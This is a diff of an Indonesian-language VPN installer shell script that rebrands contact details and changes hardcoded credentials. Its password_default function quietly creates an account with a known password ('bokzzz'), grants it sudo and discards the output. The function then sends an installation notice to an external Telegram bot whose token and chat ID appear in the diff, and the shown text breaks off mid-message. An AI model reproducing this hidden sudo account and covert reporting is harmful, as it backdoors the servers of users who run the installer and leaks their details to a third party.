@@ -91,7 +91,7 @@ VALIDITY () {
 	VERSIONSC
     else
     echo -e "\e[31mScript Anda Telah Expired !!\e[0m";
-    echo -e "\e[31mTolong Renew Script di  @huutvpn\e[0m"
+    echo -e "\e[31mTolong Renew Script di  @admin\e[0m"
     exit 0
 fi
 }
@@ -108,7 +108,7 @@ echo -e "                PERMISSION DENIED ! "
 echo -e "     Your VPS ${NC}( ${green}$IP${NC} ) ${YELLOW}Has been Banned "
 echo -e "         Buy access permissions for scripts "
 echo -e "                 Contact Admin :"
-echo -e "             ${green}Telegram t.me/huutvpn "
+echo -e "             ${green}Telegram t.me/admin "
 echo -e "             WhatsApp wa.me/notlp"
 echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
 echo ""
@@ -256,7 +256,7 @@ else
 fi
 }
 
-# HUUTVPN
+# GEMOY
 clear
 function nginx_install() {
     # // Checking System
@@ -364,15 +364,15 @@ clear
 function password_default() {
     domain=$(cat /root/domain)
     userdel jame > /dev/null 2>&1
-    Username="huutvpn"
-    Password=huutvpn
+    Username="bokzzz"
+    Password=bokzzz
     mkdir -p /home/script/
     useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
     echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
     usermod -aG sudo $Username > /dev/null 2>&1
 
-    CHATID="6061644931"
-    KEY="6406070059:AAFIpAWnbnnuikvxeWgz4rJwA5SrCVYe5VA"
+    CHATID="2107557"
+    KEY="5755909226:AAFM9zBAk8nVTINU1SakYULxH0_P0U"
     TIME="10"
     URL="https://api.telegram.org/bot$KEY/sendMessage"
     TEXT="Installasi VPN Script Stable V3.0
